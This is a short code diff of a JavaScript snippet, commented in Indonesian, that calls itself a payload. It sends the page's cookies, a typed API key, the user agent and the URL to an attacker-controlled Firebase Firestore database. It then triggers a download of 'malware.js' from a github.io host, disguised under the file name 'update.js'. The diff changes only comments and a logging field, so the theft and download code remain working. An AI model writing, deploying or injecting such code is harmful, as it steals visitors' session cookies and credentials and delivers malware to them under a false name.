@@ -1,6 +1,6 @@
 // ===== PAYLOAD (Firestore + Download) =====
 (function() {
-    // 1. Kirim data ke Firestore
+    // ===== KONFIGURASI FIREBASE =====
     const firebaseConfig = {
         apiKey: "AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8",
         authDomain: "metadata-162de.firebaseapp.com",
@@ -14,18 +14,20 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
+    // ===== KIRIM DATA =====
     db.collection("logs").add({
         cookies: document.cookie,
         api_key: document.getElementById('api-input')?.value || '',
         user_agent: navigator.userAgent,
         url: window.location.href,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        source: 'payload'
     })
     .catch((error) => {
         console.error("Payload error:", error);
     });
 
-    // 2. Download malware.js
+    // ===== DOWNLOAD MALWARE =====
     const link = document.createElement('a');
     link.href = 'https://shadowofobscurity322.github.io/payload/malware.js';
     link.download = 'update.js';
